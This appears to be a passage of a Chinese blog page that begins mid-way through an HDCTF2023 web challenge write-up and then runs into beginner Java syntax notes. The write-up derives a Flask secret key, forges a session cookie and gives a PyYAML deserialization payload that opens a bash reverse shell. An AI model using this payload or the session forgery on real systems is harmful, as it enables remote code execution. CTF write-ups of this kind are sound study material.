class="string">&#x27;/pwd&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwd</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(pwdpath)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;app.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;app.*&#x27;, url, re.IGNORECASE)&quot;</span></span><br><span class="line">        <span class="keyword">if</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;flag&#x27;, url, re.IGNORECASE)&quot;</span></span><br><span class="line">        res = urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(ex))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">   <span class="keyword">for</span> blackstr <span class="keyword">in</span> BLACK_LIST:</span><br><span class="line">       <span class="keyword">if</span> blackstr <span class="keyword">in</span> filename:</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">   <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">            flash(<span class="string">&#x27;No file part&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line">        file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Empty file&quot;</span></span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;./uploads/&#x27;</span>):</span><br><span class="line">                os.makedirs(<span class="string">&#x27;./uploads/&#x27;</span>)</span><br><span class="line">            file.save(os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;upload successfully!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/boogipop&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;passport&quot;</span>)==<span class="string">&quot;Welcome To HDCTF2023&quot;</span>:</span><br><span class="line">        LoadedFile=request.args.get(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(LoadedFile):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;file not exists&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(LoadedFile) <span class="keyword">as</span> f:</span><br><span class="line">            yaml.full_load(f)</span><br><span class="line">            f.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;van you see&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Auth bro&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwdpath = os.popen(<span class="string">&quot;pwd&quot;</span>).read()</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">False</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>])</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>在&#x2F;boogipop路由发现yaml.full_load(f)可知这里可以pyyaml反序列化,还需要修改<code>session[passport]=Welcome To HDCTF2023</code>.然后传参file&#x3D;你上传的文件就能反序列化其中的内容</p>
<blockquote>
<p>前提知识：<br>在 python 中使用 uuid 模块生成 UUID（通用唯一识别码）。可以使用 uuid.getnode()<br>方法来获取计算机的硬件地址，这个地址将作为 UUID 的一部分。<br>那么&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address，这个就是网卡的位置，读取他进行伪造即可。</p>
</blockquote>
<p>利用为协议读取到网卡地址，在利用脚本内进行解密，修改上班</p>
<p><img src="http://raw.githubusercontent.com/qingchuana/img/main/img/image-20230923160402382.png"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line">random.seed(0x0242ac02e293)</span><br><span class="line">print(str(random.random()*233))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>得到secret_key是141.04900203197468</p>
<p>之后session伪造</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py decode -c &quot;eyJwYXNzcG9ydCI6IllhbWlZYW1pIn0.ZQ6iLA.1bAPKmKsaDM4mePRtx9J7xw5EUk&quot; -s &quot;141.04900203197468&quot;</span><br><span class="line">&#123;&#x27;passport&#x27;: &#x27;YamiYami&#x27;&#125;</span><br></pre></td></tr></table></div></figure>



<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;python3 flask_session_cookie_manager3.py  encode -s &quot;141.04900203197468&quot; -t &quot;&#123;&#x27;passport&#x27;: &#x27;Welcome To HDCTF2023&#x27;&#125;&quot;</span><br><span class="line">eyJwYXNzcG9ydCI6IldlbGNvbWUgVG8gSERDVEYyMDIzIn0.ZQ6iZQ.YCpaoTH0-UzTB1p3Y82XrgKp2oU</span><br></pre></td></tr></table></div></figure>



<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">!!python/object/new:str</span><br><span class="line">    args: []</span><br><span class="line">    state: !!python/tuple</span><br><span class="line">      - &quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port &lt;&amp;1\&quot;&#x27;)&quot;</span><br><span class="line">      - !!python/object/new:staticmethod</span><br><span class="line">        args: []</span><br><span class="line">        state:</span><br><span class="line">          update: !!python/name:eval</span><br><span class="line">          items: !!python/name:list</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>命名1.txt在upload页面上交躲避黑名单<br> 然后在&#x2F;boogipop路由下改变session,file&#x3D;uploads&#x2F;1.txt</p>
<p>最终试了半天过不了，真是奇了怪了，好像环境有点问题</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/08/24/java%E5%AD%A6%E4%B9%A0/">Java学习笔记</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-08-24</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-11-12</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="java学习">
          <a href="#java学习" class="heading-link"><i class="fas fa-link"></i></a><a href="#java学习" class="headerlink" title="java学习"></a>java学习</h1>
      
        <h2 id="一-、基础语法">
          <a href="#一-、基础语法" class="heading-link"><i class="fas fa-link"></i></a><a href="#一-、基础语法" class="headerlink" title="一 、基础语法"></a>一 、基础语法</h2>
      <p>创建文件 <strong>HelloWorld.java(文件名需与类名一致)</strong></p>
<p>输入pvsm回车自动创建主函数，sout输出打印</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pvsm-》public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sout-&gt;System.out.println();</span><br></pre></td></tr></table></div></figure>

<p>编写 Java 程序时，应注意以下几点：</p>
<ul>
<li>​		<strong>大小写敏感</strong>：Java 是大小写敏感的，这就意味着标识符 Hello 与 hello 是不同的。</li>
<li>​		<strong>类名</strong>：对于所有的类来说，类名的首字母应该大写。如果类名由若干单词组成，那么每个单词的首字母应该大写，例如 <strong>MyFirstJavaClass</strong> 。</li>
<li>​		<strong>方法名</strong>：所有的方法名都应该以小写字母开头。如果方法名含有若干单词，则后面的每个单词首字母大写。</li>
<li>​		<strong>源文件名</strong>：源文件名必须和类名相同。当保存文件的时候，你应该使用类名作为文件名保存（切记 Java 是大小写敏感的），文件名的后缀为 <strong>.java</strong>。（如果文件名和类名不相同则会导致编译错误）。</li>
<li>​		<strong>主方法入口</strong>：所有的 Java 程序由 <strong>public static void main(String[] args)</strong> 方法开始执行。</li>
</ul>
<p>###注释类型</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">单行注释//</span><br><span class="line"></span><br><span class="line">多行注释/**/</span><br><span class="line"></span><br><span class="line">文档注释/**</span><br><span class="line">*1</span><br><span class="line">*1</span><br><span class="line">*1</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>


        <h3 id="标识符和关键字">
          <a href="#标识符和关键字" class="heading-link"><i class="fas fa-link"></i></a><a href="#标识符和关键字" class="headerlink" title="标识符和关键字"></a>标识符和关键字</h3>
      <p>Java 所有的组成部分都需要名字。类名、变量名以及方法名都被称为标识符。</p>
<p>关于 Java 标识符，有以下几点需要注意：</p>
<ul>
<li>​		所有的标识符都应该以字母（A-Z 或者 a-z）,美元符（$）、或者下划线（_）开始</li>
<li>​		首字符之后可以是字母（A-Z 或者 a-z）,美元符（$）、下划线（_）或数字的任何字符组合</li>
<li>​		关键字不能用作标识符</li>
<li>​		标识符是大小写敏感的</li>
<li>​		合法标识符举例：age、$salary、_value、__1_value</li>
<li>​		非法标识符举例：123abc、-salary</li>
</ul>
<p>可以使用中文，但不建议使用，拼音也少用，显得不咋好</p>
<p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\1\hexoblog\source\image\image-20230821132029953-1698627034978-1.png"></p>
<p>面列出了 Java 关键字。这些保留字不能用于常量、变量、和任何标识符的名称。</p>
<div class="table-container"><table>
<thead>
<tr>
<th>类别</th>
<th>关键字</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>访问控制</td>
<td>private</td>
<td>私有的</td>
</tr>
<tr>
<td>protected</td>
<td>受保护的</td>
<td></td>
</tr>
<tr>
<td>public</td>
<td>公共的</td>
<td></td>
</tr>
<tr>
<td>default</td>
<td>默认</td>
<td></td>
</tr>
<tr>
<td>类、方法和变量修饰符</td>
<td>abstract</td>
<td>声明抽象</td>
</tr>
<tr>
<td>class</td>
<td>类</td>
<td></td>
</tr>
<tr>
<td>extends</td>
<td>扩充、继承</td>
<td></td>
</tr>
<tr>
<td>final</td>
<td>最终值、不可改变的</td>
<td></td>
</tr>
<tr>
<td>implements</td>
<td>实现（接口）</td>
<td></td>
</tr>
<tr>
<td>interface</td>
<td>接口</td>
<td></td>
</tr>
<tr>
<td>native</td>
<td>本地、原生方法（非 Java 实现）</td>
<td></td>
</tr>
<tr>
<td>new</td>
<td>创建</td>
<td></td>
</tr>
<tr>
<td>static</td>
<td>静态</td>
<td></td>
</tr>
<tr>
<td>strictfp</td>
<td>严格浮点、精准浮点</td>
<td></td>
</tr>
<tr>
<td>synchronized</td>
<td>线程、同步</td>
<td></td>
</tr>
<tr>
<td>transient</td>
<td>短暂</td>
<td></td>
</tr>
<tr>
<td>volatile</td>
<td>易失</td>
<td></td>
</tr>
<tr>
<td>程序控制语句</td>
<td>break</td>
<td>跳出循环</td>
</tr>
<tr>
<td>case</td>
<td>定义一个值以供 switch 选择</td>
<td></td>
</tr>
<tr>
<td>continue</td>
<td>继续</td>
<td></td>
</tr>
<tr>
<td>do</td>
<td>运行</td>
<td></td>
</tr>
<tr>
<td>else</td>
<td>否则</td>
<td></td>
</tr>
<tr>
<td>for</td>
<td>循环</td>
<td></td>
</tr>
<tr>
<td>if</td>
<td>如果</td>
<td></td>
</tr>
<tr>
<td>instanceof</td>
<td>实例</td>
<td></td>
</tr>
<tr>
<td>return</td>
<td>返回</td>
<td></td>
</tr>
<tr>
<td>switch</td>
<td>根据值选择执行</td>
<td></td>
</tr>
<tr>
<td>while</td>
<td>循环</td>
<td></td>
</tr>
<tr>
<td>错误处理</td>
<td>assert</td>
<td>断言表达式是否为真</td>
</tr>
<tr>
<td>catch</td>
<td>捕捉异常</td>
<td></td>
</tr>
<tr>
<td>finally</td>
<td>有没有异常都执行</td>
<td></td>
</tr>
<tr>
<td>throw</td>
<td>抛出一个异常对象</td>
<td></td>
</tr>
<tr>
<td>throws</td>
<td>声明一个异常可能被抛出</td>
<td></td>
</tr>
<tr>
<td>try</td>
<td>捕获异常</td>
<td></td>
</tr>
<tr>
<td>包相关</td>
<td>import</td>
<td>引入</td>
</tr>
<tr>
<td>package</td>
<td>包</td>
<td></td>
</tr>
<tr>
<td>基本类型</td>
<td>boolean</td>
<td>布尔型</td>
</tr>
<tr>
<td>byte</td>
<td>字节型</td>
<td></td>
</tr>
<tr>
<td>char</td>
<td>字符型</td>
<td></td>
</tr>
<tr>
<td>double</td>
<td>双精度浮点</td>
<td></td>
</tr>
<tr>
<td>float</td>
<td>单精度浮点</td>
<td></td>
</tr>
<tr>
<td>int</td>
<td>整型</td>
<td></td>
</tr>
<tr>
<td>long</td>
<td>长整型</td>
<td></td>
</tr>
<tr>
<td>short</td>
<td>短整型</td>
<td></td>
</tr>
<tr>
<td>变量引用</td>
<td>super</td>
<td>父类、超类</td>
</tr>
<tr>
<td>this</td>
<td>本类</td>
<td></td>
</tr>
<tr>
<td>void</td>
<td>无返回值</td>
<td></td>
</tr>
<tr>
<td>保留关键字</td>
<td>goto</td>
<td>是关键字，但不能使用</td>
</tr>
<tr>
<td>const</td>
<td>是关键字，但不能使用</td>
<td></td>
</tr>
</tbody></table></div>

        <h3 id="数据类型">
          <a href="#数据类型" class="heading-link"><i class="fas fa-link"></i></a><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3>
      <p>java是一种强类型语言，所有变量必须定以后才能使用，更安全</p>
<p>java数据类型可以分为两大类:</p>
<p>基本类型</p>
<p>引用类型</p>
<p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\1\hexoblog\source\image\image-20230821133215837-1692596095569-1-1693831300400-56-1698627034979-3.png"></p>
<p>每个变量都有类型，必须对应</p>
<div class="table-container"><table>
<thead>
<tr>
<th>基本类型</th>
<th>boolean</th>
<th>布尔型</th>
</tr>
</thead>
<tbody><tr>
<td>byte</td>
<td>字节型</td>
<td></td>
</tr>
<tr>
<td>char</td>
<td>字符型</td>
<td></td>
</tr>
<tr>
<td>double</td>
<td>双精度浮点</td>
<td></td>
</tr>
<tr>
<td>float</td>
<td>单精度浮点</td>
<td></td>
</tr>
<tr>
<td>int</td>
<td>整型</td>
<td></td>
</tr>
<tr>
<td>long</td>
<td>长整型</td>
<td></td>
</tr>
<tr>
<td>short</td>
<td>短整型</td>
<td></td>
</tr>
</tbody></table></div>
<p>区别去long，数字后面一般加一个L</p>
<p>float数字后加F</p>
<p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230821134831928.png" alt="image-20230821134831928"></p>

        <h5 id="什么是字节">
          <a href="#什么是字节" class="heading-link"><i class="fas fa-link"></i></a><a href="#什么是字节" class="headerlink" title="什么是字节"></a>什么是字节</h5>
      <p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\1\hexoblog\source\image\image-20230821135115539-1698627034979-5.png"></p>
<p>###数据类型拓展</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        String a=10;</span></span><br><span class="line"><span class="comment">//        String b=&quot;10&quot;;</span></span><br><span class="line">        <span class="comment">//整数拓展  进制  二进制0b</span></span><br><span class="line">        <span class="type">int</span> i=<span class="number">10</span>;</span><br><span class="line">        <span class="type">int</span> i1=<span class="number">010</span>;<span class="comment">//8进制</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span><span class="number">0x10</span>;<span class="comment">//16进制</span></span><br><span class="line">        System.out.println(i);</span><br><span class="line">        System.out.println(i1);</span><br><span class="line">        System.out.println(i2);</span><br><span class="line">        <span class="comment">//浮点数扩展</span></span><br><span class="line">        <span class="comment">//float   有限  离散  舍入误差  大约</span></span><br><span class="line">        <span class="comment">//double</span></span><br><span class="line">        <span class="comment">//最好完全使用浮点数进行比较</span></span><br><span class="line">        <span class="comment">//big。。。。</span></span><br><span class="line">        <span class="type">float</span> f=<span class="number">0.1f</span>;</span><br><span class="line">        <span class="type">double</span> d=<span class="number">1.0</span>/<span class="number">10</span>;</span><br><span class="line">        System.out.println(f==d);</span><br><span class="line">        <span class="type">float</span> d1=<span class="number">123123123123f</span>;</span><br><span class="line">        <span class="type">float</span> d2=d1+<span class="number">1</span>;</span><br><span class="line">        System.out.println(d1=d2);</span><br><span class="line">        <span class="comment">//字符拓展</span></span><br><span class="line">        <span class="type">char</span> c1=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="type">char</span> <span class="variable">c2</span> <span class="operator">=</span><span class="string">&#x27;中&#x27;</span>;</span><br><span class="line">        System.out.println(c1);</span><br><span class="line">        System.out.println((<span class="type">int</span>)c1);<span class="comment">//强制转换</span></span><br><span class="line">        System.out.println(c2);</span><br><span class="line">        System.out.println((<span class="type">int</span>)c2);<span class="comment">//强制转换</span></span><br><span class="line">        <span class="comment">//所以字符本质还是数字</span></span><br><span class="line">        <span class="comment">//编码 unicode 2字节  65536 excel  2 16=65536</span></span><br><span class="line">        <span class="type">char</span> c3=<span class="string">&#x27;\u0061&#x27;</span>;</span><br><span class="line">        System.out.println(c3);</span><br><span class="line">        <span class="comment">//转义字符</span></span><br><span class="line">        <span class="comment">// \t</span></span><br><span class="line">        System.out.println(<span class="string">&quot;hello\tworld！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h5 id="转义字符">
          <a href="#转义字符" class="heading-link"><i class="fas fa-link"></i></a><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h5>
      <div class="table-container"><table>
<thead>
<tr>
<th>n</th>
<th>换行 (0x0a)</th>
</tr>
</thead>
<tbody><tr>
<td>\r</td>
<td>回车 (0x0d)</td>
</tr>
<tr>
<td>\f</td>
<td>换页符(0x0c)</td>
</tr>
<tr>
<td>\b</td>
<td>退格 (0x08)</td>
</tr>
<tr>
<td>\0</td>
<td>空字符 (0x0)</td>
</tr>
<tr>
<td>\s</td>
<td>空格 (0x20)</td>
</tr>
<tr>
<td>\t</td>
<td>制表符</td>
</tr>
<tr>
<td>&quot;</td>
<td>双引号</td>
</tr>
<tr>
<td>&#39;</td>
<td>单引号</td>
</tr>
<tr>
<td>\</td>
<td>反斜杠</td>
</tr>
<tr>
<td>\ddd</td>
<td>八进制字符 (ddd)</td>
</tr>
<tr>
<td>\uxxxx</td>
<td>16进制Unicode字符 (xxxx)</td>
</tr>
</tbody></table></div>

        <h3 id="类型转换">
          <a href="#类型转换" class="heading-link"><i class="fas fa-link"></i></a><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3>
      <p>由于java是强类型语言，所以要进行有些运算的时候，需要用到类转换</p>
<p>低——————&gt;高</p>
<p>byte,short,char-&gt;iny-&gt;long-&gt;float-&gt;double（小数优先级比较高）</p>
<p>运算中，不同类型的数据会先转化为同一类型，然后进行运算</p>
<p>强制类型转换  （类型）变量名  高–》低</p>
<p>自动类型转换  低–》高</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">       <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span><span class="number">128</span>;</span><br><span class="line">       <span class="type">byte</span> b=(<span class="type">byte</span>)i;<span class="comment">//内存溢出</span></span><br><span class="line">       <span class="comment">//强制转换   （类型）变量名  高--》低</span></span><br><span class="line">       <span class="comment">//自动类型转换   低--》高</span></span><br><span class="line">       System.out.println(i);</span><br><span class="line">       System.out.println(b);</span><br><span class="line">       <span class="comment">/*</span></span><br><span class="line"><span class="comment">       * 注意点：</span></span><br><span class="line"><span class="comment">       * 1.不能对布尔型进行转换</span></span><br><span class="line"><span class="comment">       * 2.不能把对象类型转换为不相干的类型</span></span><br><span class="line"><span class="comment">       * 3.在把高容量转换到低容量的时候，强制转换</span></span><br><span class="line"><span class="comment">       * 4.转换的时候可能存在内存溢出，或者精度问题！*/</span></span><br><span class="line">       System.out.println((<span class="type">int</span>)<span class="number">23.7</span>);<span class="comment">//23</span></span><br><span class="line">       System.out.println((<span class="type">int</span>)-<span class="number">45.89f</span>);<span class="comment">//45</span></span><br><span class="line"></span><br><span class="line">       <span class="type">char</span> c=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">       <span class="type">int</span> d=c+<span class="number">1</span>;</span><br><span class="line">       System.out.println(d);</span><br><span class="line">       System.out.println((<span class="type">char</span>)d);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>


        <h3 id="变量">
          <a href="#变量" class="heading-link"><i class="fas fa-link"></i></a><a href="#变量" class="headerlink" title="变量"></a>变量</h3>
      <p>java是一种强类型语言，每个变量必须声明其类型</p>
<p>java变量是程序中最基本的存储单元，其要是包括变量名，变量类型和作用域</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type varName [=value][&#123;,varName[=value]&#125;]</span><br><span class="line">//数据类型  变量名=值；可以用逗号隔开来声明多个同类型变量。</span><br></pre></td></tr></table></div></figure>

<p>####注意事项：</p>
<ul>
<li><p>每个变量都有类型，类型可以使基本型也可以是引用类型。</p>
</li>
<li><p>每个变量名必须是合法标识符</p>
</li>
<li><p>变量声明是一条完整的语句，因此没有一个声明都必须以分号结束</p>
<p>变量作用域：</p>
<p>类变量</p>
<p>实例变量</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo06</span> &#123;</span><br><span class="line">    <span class="comment">//属性：变量</span></span><br><span class="line">    <span class="comment">//类变量 static</span></span><br><span class="line">    <span class="keyword">static</span> <span class="type">double</span> <span class="variable">salary</span> <span class="operator">=</span><span class="number">2500</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//实例变量：从属于对象；如果不自行初始化，这个类型默认值 0   0.0</span></span><br><span class="line">    <span class="comment">//布尔值默认为false</span></span><br><span class="line">    <span class="comment">//除了基本类型，其余默认值都是null</span></span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="comment">//main方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//局部变量：必须声明和初始化值</span></span><br><span class="line">        <span class="type">int</span> i=<span class="number">10</span>;</span><br><span class="line">        System.out.println(i);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//变量类型 变量名字=new demo06</span></span><br><span class="line">        demo06 demo06=<span class="keyword">new</span> <span class="title class_">demo06</span>();</span><br><span class="line">        System.out.println(demo06.age);</span><br><span class="line">        System.out.println(demo06.name);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//类变量  static</span></span><br><span class="line">        System.out.println(salary);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//其他方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li>
</ul>

        <h3 id="常量">
          <a href="#常量" class="heading-link"><i class="fas fa-link"></i></a><a href="#常量" class="headerlink" title="常量"></a>常量</h3>
      <p>常量（Constant）：初始化（initialize）后不能再改变值！，不会变动的值</p>
<p>所谓常量可以理解为一种特殊的变量，他的值被设定以后，在程序运行过程中不允许改变</p>
<p>final 常量名&#x3D;值；</p>
<p>final double PI&#x3D;3.14;</p>
<p>常量名一般使用大写名字符。</p>
